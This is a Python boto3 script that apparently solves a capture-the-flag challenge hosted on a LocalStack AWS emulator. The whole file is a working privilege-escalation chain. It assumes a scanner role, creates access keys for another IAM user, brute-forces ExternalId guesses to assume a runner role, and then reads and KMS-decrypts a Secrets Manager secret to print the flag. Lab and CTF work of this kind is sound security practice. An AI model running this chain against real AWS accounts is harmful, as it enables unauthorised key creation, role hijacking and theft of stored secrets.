import boto3
EP='http://154.57.164.69:31977'; ACC='593847102664'
# credentials for the per-instance LocalStack challenge (torn down after solve; replace with your own)
AK='[REDACTED]'; SK='[REDACTED]'
PAY='supply-road/payout/eastreach-relay-3d9c'
def cli(svc, creds=None, keys=None):
    if keys: kw=dict(endpoint_url=EP, region_name='us-east-1', aws_access_key_id=keys[0], aws_secret_access_key=keys[1])
    elif creds: kw=dict(endpoint_url=EP, region_name='us-east-1', aws_access_key_id=creds['AccessKeyId'], aws_secret_access_key=creds['SecretAccessKey'], aws_session_token=creds['SessionToken'])
    else: kw=dict(endpoint_url=EP, region_name='us-east-1', aws_access_key_id=AK, aws_secret_access_key=SK)
    return boto3.client(svc, **kw)
scanner=cli('sts').assume_role(RoleArn=f'arn:aws:iam::{ACC}:role/supply-road-scanner', RoleSessionName='sess', ExternalId='eastreach-road-scanner-3d9c')['Credentials']
# 1) scanner mints road-messenger access key
ak=cli('iam',scanner).create_access_key(UserName='road-messenger')['AccessKey']
mk=(ak['AccessKeyId'], ak['SecretAccessKey'])
print('[+] road-messenger keys:', mk[0])
print('[+] identity:', cli('sts',keys=mk).get_caller_identity()['Arn'])
# 2) as road-messenger, assume runner (try external id variants)
RUN=f'arn:aws:iam::{ACC}:role/supply-road-runner'
msg_sts=cli('sts',keys=mk)
exts=[None,'eastreach-supply-road-runner-3d9c','eastreach-road-runner-3d9c','eastreach-relay-3d9c','EASTREACH-RELAY']
runner=None
for ext in exts:
    try:
        kw=dict(RoleArn=RUN, RoleSessionName='sess')
        if ext: kw['ExternalId']=ext
        runner=msg_sts.assume_role(**kw)['Credentials']
        print(f'[+] assumed runner as road-messenger (ext={ext})'); break
    except Exception as e:
        print(f'   runner ext={ext}: {str(e).split("when calling")[0][-20:]}')
if runner:
    v=cli('secretsmanager',runner).get_secret_value(SecretId=PAY)
    raw=v.get('SecretBinary') or (v.get('SecretString') or '').encode()
    if raw.startswith(b'kms:'):
        flag=cli('kms',runner).decrypt(CiphertextBlob=raw, KeyId=raw.decode().split(':')[2])['Plaintext'].decode()
    else:
        flag=raw.decode()
    print('\n[+++] PAYOUT / FLAG:', flag)
